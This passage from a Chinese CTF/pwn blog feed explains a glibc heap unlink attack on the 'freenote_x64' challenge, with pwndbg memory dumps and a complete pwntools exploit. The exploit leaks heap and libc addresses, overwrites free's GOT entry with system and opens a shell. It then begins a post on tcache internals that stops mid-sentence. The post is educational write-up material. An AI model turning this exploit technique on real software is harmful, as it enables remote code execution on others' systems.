//p=&amp;p-0x18</span><br><span class="line">0x603040:0x0000000000000008 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了；</p><h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>伪造的如下三个堆块结构 ，注意chunk前后的size一定要相对应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x17b8820</span><br><span class="line">0x17b8820:0x00000000000000000x0000000000000191</span><br><span class="line">0x17b8830:0x00000000000000900x0000000000000081</span><br><span class="line">0x17b8840:0x00000000017b70180x00000000017b7020</span><br><span class="line">0x17b8850:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8860:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8870:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8880:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8890:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x17b88c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8900:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8910:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8920:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8930:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8940:0x00000000000000900x0000000000000121</span><br><span class="line">0x17b8950:0x32323232323232320x00007f61721feb78</span><br><span class="line">0x17b8960:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8970:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8980:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8990:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x17b89c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x17b89e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b89f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a00:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a10:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a20:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a30:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a40:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>free(1)之后，堆块的结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x11dd820</span><br><span class="line">0x11dd820:0x00000000000000000x0000000000000191</span><br><span class="line">0x11dd830:0x00000000000000900x0000000000000111</span><br><span class="line">0x11dd840:0x00007fc6bdb86b780x00007fc6bdb86b78</span><br><span class="line">0x11dd850:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd860:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd870:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd880:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd890:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x11dd8c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd900:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd910:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd920:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd930:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd940:0x00000000000001100x0000000000000120</span><br><span class="line">0x11dd950:0x32323232323232320x00007fc6bdb86b78</span><br><span class="line">0x11dd960:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd970:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd980:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd990:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x11dd9c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x11dd9e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dd9f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda00:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda10:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda20:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda30:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda40:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>而目标地址已经被修改为 p=&amp;p-0x18<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x11dc000</span><br><span class="line">0x11dc000:0x00000000000000000x0000000000001821</span><br><span class="line">0x11dc010:0x00000000000001000x0000000000000000</span><br><span class="line">0x11dc020:0x00000000000000010x0000000000000120</span><br><span class="line">0x11dc030:0x00000000011dc0180x0000000000000000  //p=&amp;p-0x18</span><br><span class="line">0x11dc040:0x00000000000000000x00000000011dd8c0</span><br><span class="line">0x11dc050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc060:0x00000000011dd9500x0000000000000000</span><br><span class="line">0x11dc070:0x00000000000000000x00000000011dd9e0</span><br><span class="line">0x11dc080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc090:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc100:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc120:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>接下来向 chunk0 里面写内容就相当于控制了chunk list，随便修改东西，这里把free_got覆盖为system</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29050</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'11111111'</span>)</span><br><span class="line">new(<span class="string">'22222222'</span>)</span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'11111111'</span>)</span><br><span class="line">s=p.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">chunk2=u64(s[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=chunk2<span class="number">-0x1940</span></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0<span class="number">-0x18</span>)+p64(point_chunk0<span class="number">-0x10</span>) </span><br><span class="line">payload +=<span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload +=<span class="string">'c'</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line">free_got_addr=e.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(free_got_addr)</span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">'atoi'</span>])</span><br><span class="line">payload2+=<span class="string">'\x00'</span>*(<span class="number">0x120</span><span class="number">-80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: Invalid!\n'</span>)</span><br><span class="line"></span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'2. '</span>)</span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">system_in_server=libc.symbols[<span class="string">'system'</span>]+atoi_in_server-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/qq_40827990/java/article/details/88090810" target="_blank" rel="noopener">https://blog.csdn.net/qq_40827990/java/article/details/88090810</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个s
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tcache机制</title>
    <link href="https://nocbtm.github.io/2020/02/27/tcache%E6%9C%BA%E5%88%B6/"/>
    <id>https://nocbtm.github.io/2020/02/27/tcache机制/</id>
    <published>2020-02-27T03:36:21.000Z</published>
    <updated>2020-04-09T13:15:24.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc 2.26</code> 开始引入了 <code>tcache</code> , 相关的 commit 可以看<br><a href="https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="noopener">https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc</a> 。<br>加入 <code>tcache</code> 对性能有比较大的提升，不过由于 <code>tcache</code> 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。</p><p>相关文件位于 <a href="https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache" target="_blank" rel="noopener">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</a></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先分析分析源码，看看 <code>tcache</code> 的工作原理</p><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p><code>tcache</code> 也是使用 类似 bins 方式来管理<code>tcache</code>  。</p><p><code>tcache_perthread_struct</code> 是整个<code>tcache</code> </p><p>每一项由 相同大小的 chunk 通过 <code>tcache_entry</code> 使用单向链表链接（类似于fastbin的链接方式）。</p><p>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</p><p><code>tcache_entry</code> 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk.</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>下面通过分析对 tcache 的两个基本操作理解上面结构体的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p><p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p><p>这样就可以大概得到一个图</p><ul><li><code>tcache-&gt;entries</code> 的每一项通过 单向链表链接 <code>chunk</code> 。</li><li><code>tcache_entry</code> 和 <code>malloc chunk</code> 是重叠的， <code>tcache_entry-&gt;next</code> 和 <code>chunk-&gt;fd</code> 是一个位置。</li></ul><h2 id="tcache-in-malloc"><a href="#tcache-in-malloc" class="headerlink" title="tcache in malloc"></a>tcache in malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><code>malloc</code> 的入口点是 <code>__libc_malloc</code> （做了一些注释）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);  <span class="comment">// tbytes 为 bytes请求的 转换后得到的 chunk 的 size</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);  <span class="comment">// 根据大小 tbytes ， 找到 tcache-&gt;entries 索引</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 调用 tcache_get 拿到 chunk 然后返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>首先判断 <code>tcache-&gt;entries[tc_idx]</code> 里面有没有 <code>chunk</code> ，如果有就直接返回，否则进入 <code>_int_malloc</code> 分配内存。</p><p>下面看看 <code>_int_malloc</code> （主要看 <code>tcache</code> 处理的部分）</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><h4 id="处理fastbin"><a href="#处理fastbin" class="headerlink" title="处理fastbin"></a>处理fastbin</h4><p>首先是把 请求的 <code>size</code> 转换成 实际 <code>malloc</code> 内部的 <code>size</code> ，然后定义了一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 fastbin里面移除 pp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line">  <span class="keyword">do</span>\</span><br><span class="line">    &#123;\</span><br><span class="line">      victim = pp;\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)\</span><br><span class="line"><span class="keyword">break</span>;\</span><br><span class="line">    &#125;\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line"> != victim);</span><br></pre></td></tr></table></figure><p>用于多线程的中从 <code>fastbin</code> 里面移除一个 